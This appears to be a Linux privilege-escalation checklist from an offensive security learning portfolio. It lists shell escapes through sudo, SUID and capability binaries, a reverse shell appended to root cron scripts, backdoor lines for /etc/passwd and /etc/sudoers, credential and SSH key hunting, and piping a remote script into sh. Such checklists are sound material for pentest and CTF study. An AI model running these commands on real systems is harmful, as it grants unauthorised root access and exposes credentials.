# Linux Privilege Escalation Checklist
**Status:** Living document — updated as new techniques are learned  
**Last Updated:** April 2026  
**Reference:** GTFOBins (gtfobins.github.io) — essential companion to this document  

---

## Philosophy

Privilege escalation on Linux is a systematic process, not a guessing game. The answer is almost always in one of the categories below. Work through them in order rather than jumping to the most complex techniques first — misconfigured sudo permissions and SUID binaries are found far more often than kernel exploits.

When you find a potential vector, verify it manually before running automated tools. Understanding why something works makes the technique transferable.

---

## Immediate Post-Shell Checklist

Run these the moment you get a shell — before anything else.

```bash
# Who am I and what groups do I belong to
id
whoami
groups

# Upgrade to fully interactive shell immediately
python3 -c 'import pty;pty.spawn("/bin/bash")'
# OR
python -c 'import pty;pty.spawn("/bin/bash")'
# OR
script /dev/null -c bash

# After pty spawn — fix terminal
export TERM=xterm
# Ctrl+Z
stty raw -echo; fg

# Where am I
pwd
hostname
uname -a
cat /etc/os-release
cat /proc/version

# Network context — what else is reachable
ip a
ip route
cat /etc/hosts
ss -tulnp
netstat -tulnp
```

- [ ] Current user and groups confirmed
- [ ] Shell upgraded to interactive TTY
- [ ] OS and kernel version noted
- [ ] Network interfaces and routes noted
- [ ] Internal services on localhost identified

---

## Category 1 — Sudo Permissions

**Check first. This is the most common path.**

```bash
sudo -l
```

Whatever is listed — check GTFOBins immediately. Almost every binary has a documented technique.

Common high-value sudo entries:

```bash
# If (ALL) NOPASSWD: /bin/bash or similar
sudo /bin/bash

# If vim
sudo vim -c ':!/bin/bash'

# If find
sudo find / -exec /bin/bash \;

# If less/more
sudo less /etc/passwd
# Then inside less: !/bin/bash

# If nmap (older versions)
sudo nmap --interactive
# Then: !sh

# If python
sudo python3 -c 'import os; os.system("/bin/bash")'

# If awk
sudo awk 'BEGIN {system("/bin/bash")}'

# If perl
sudo perl -e 'exec "/bin/bash";'
```

- [ ] `sudo -l` output captured
- [ ] Every listed binary checked against GTFOBins
- [ ] NOPASSWD entries identified
- [ ] Sudo version checked for CVEs (`sudo --version`)

---

## Category 2 — SUID/SGID Binaries

Files with the SUID bit set run as their owner (usually root) regardless of who executes them.

```bash
# Find all SUID binaries
find / -perm -4000 -type f 2>/dev/null

# Find all SGID binaries
find / -perm -2000 -type f 2>/dev/null

# Find both
find / -perm /6000 -type f 2>/dev/null
```

Check every result against GTFOBins — filter by "SUID" category.

Common SUID exploitation paths:

```bash
# If /usr/bin/find has SUID
find . -exec /bin/sh -p \; -quit

# If /usr/bin/vim has SUID
vim.tiny -c ':python import os; os.execl("/bin/sh", "sh", "-pc", "reset; exec sh -p")'

# If /usr/bin/bash has SUID
/bin/bash -p

# If /usr/bin/python has SUID
python -c 'import os; os.execl("/bin/sh", "sh", "-p")'
```

- [ ] All SUID binaries listed
- [ ] Each unusual binary checked against GTFOBins
- [ ] Custom SUID binaries (non-standard paths) investigated with `strings`

---

## Category 3 — Cron Jobs

Cron jobs running as root that execute writable scripts are a reliable privesc path.

```bash
# System crontab
cat /etc/crontab

# All cron directories
ls -la /etc/cron*
cat /etc/cron.d/*
cat /etc/cron.daily/*
cat /etc/cron.hourly/*

# User crontabs
cat /var/spool/cron/crontabs/* 2>/dev/null

# Running processes — catch jobs that aren't in crontab
ps aux

# Watch for new processes (useful for identifying cron timing)
watch -n 1 ps aux
```

If a cron job runs a script you can write to:

```bash
# Check permissions on the script
ls -la [script path]

# If writable, add reverse shell
echo 'bash -i >& /dev/tcp/[your IP]/4444 0>&1' >> [script path]

# Start listener on your machine
nc -lvnp 4444
```

- [ ] All cron jobs listed
- [ ] Scripts called by root cron jobs identified
- [ ] Permissions on those scripts checked
- [ ] Writable scripts noted as privesc vectors

---

## Category 4 — Writable Files and Directories

```bash
# Files owned by root that current user can write
find / -user root -writable -type f 2>/dev/null

# World-writable directories
find / -type d -perm -o+w 2>/dev/null

# World-writable files
find / -type f -perm -o+w 2>/dev/null
```

**High-value targets if writable:**

```bash
# /etc/passwd — if writable, add new root user
# Generate password hash
openssl passwd -1 -salt [salt] [password]
# Add to /etc/passwd
echo '[user]:[hash]:0:0:root:/root:/bin/bash' >> /etc/passwd

# /etc/sudoers — if writable
echo '[current user] ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers
```

- [ ] Root-owned writable files identified
- [ ] `/etc/passwd` permissions checked
- [ ] `/etc/sudoers` permissions checked
- [ ] `/etc/shadow` permissions checked

---

## Category 5 — Capabilities

Linux capabilities are a finer-grained alternative to SUID. Check for them separately.

```bash
getcap -r / 2>/dev/null
```

High-value capabilities:

```bash
# If python has cap_setuid
python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'

# If perl has cap_setuid
perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/bash";'

# If vim has cap_setuid  
vim -c ':py3 import os; os.setuid(0); os.execl("/bin/sh","sh","-c","reset; exec sh")'
```

- [ ] All capabilities listed
- [ ] Each result with cap_setuid or cap_net_raw investigated

---

## Category 6 — Sensitive Files and Credentials

```bash
# Bash history — frequently contains plaintext passwords
cat /home/*/.bash_history 2>/dev/null
cat ~/.bash_history

# SSH keys
find / -name "id_rsa" 2>/dev/null
find / -name "id_ecdsa" 2>/dev/null
find / -name "*.pem" 2>/dev/null
cat /home/*/.ssh/id_rsa 2>/dev/null

# Configuration files with credentials
grep -r "password" /etc/ 2>/dev/null
grep -r "password" /var/www/ 2>/dev/null
grep -r "DB_PASSWORD\|db_password\|DATABASE_URL" / 2>/dev/null

# Common credential locations
cat /var/www/html/config.php 2>/dev/null
cat /var/www/html/.env 2>/dev/null
cat /opt/*/config* 2>/dev/null
```

- [ ] Bash history reviewed for all users
- [ ] SSH private keys searched for
- [ ] Web application config files reviewed
- [ ] `.env` files searched for
- [ ] Any found credentials tested against `sudo su`, SSH, and other services

---

## Category 7 — Kernel Exploits

**Check last.** Kernel exploits are unstable and can crash systems. Use only when other paths are exhausted.

```bash
# Get kernel version
uname -a
cat /proc/version

# Search for exploits
searchsploit linux kernel [version]
# Example: searchsploit linux kernel 4.4
```

Known kernel exploits worth knowing:
- **DirtyCow (CVE-2016-5195)** — affects kernels < 4.8.3. Overwrites read-only memory.
- **DirtyPipe (CVE-2022-0847)** — affects kernels 5.8–5.16.11.

```bash
# Check if DirtyCow applies
uname -r  # Should be < 4.8.3 for DirtyCow
```

- [ ] Kernel version confirmed
- [ ] searchsploit run on kernel version
- [ ] Exploit stability considered before running

---

## Category 8 — Network Services on Localhost

Services bound to 127.0.0.1 don't appear in external scans. Check what's running locally after getting a shell.

```bash
ss -tulnp
netstat -tulnp
```

Common findings: internal web servers, databases (MySQL/PostgreSQL), Redis instances not exposed externally.

```bash
# Port forward to access internal services from your machine
# (SSH port forwarding — covered separately)
ssh -L [local port]:127.0.0.1:[target port] [user]@[IP]
```

- [ ] All localhost services identified
- [ ] Any database or web services investigated

---

## Automated Enumeration Scripts

Run these after manual checks to catch anything missed. Understand the output before acting on it.

```bash
# LinPEAS — comprehensive Linux privesc enumeration
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh

# LinEnum
wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh
chmod +x LinEnum.sh
./LinEnum.sh

# Transfer to target via Python HTTP server on your machine
python3 -m http.server 8080
# Then on target:
wget http://[your IP]:8080/linpeas.sh
chmod +x linpeas.sh
./linpeas.sh
```

- [ ] LinPEAS run
- [ ] Output reviewed — focus on red and yellow highlighted items
- [ ] Any new findings from automated tools investigated manually

---

## Quick Reference — Privilege Escalation Order

1. `sudo -l` → GTFOBins
2. SUID binaries → GTFOBins
3. Cron jobs → writable scripts
4. Writable `/etc/passwd` or `/etc/sudoers`
5. Capabilities → GTFOBins
6. Sensitive files and credentials → password reuse
7. Localhost services → database access
8. Kernel exploits → last resort

---

## Notes Template

```
MACHINE: 
DATE: 
CURRENT USER: [user] ([uid])
GROUPS: 

SUDO -L OUTPUT:

SUID BINARIES (unusual):

CRON JOBS:

WRITABLE FILES OF INTEREST:

CREDENTIALS FOUND:

PRIVESC PATH USED:

HOW IT WORKED:
```

---

*Part of the [Offensive Security Portfolio](../README.md)*  
*Last updated: April 2026*  
*Reference: GTFOBins — gtfobins.github.io*
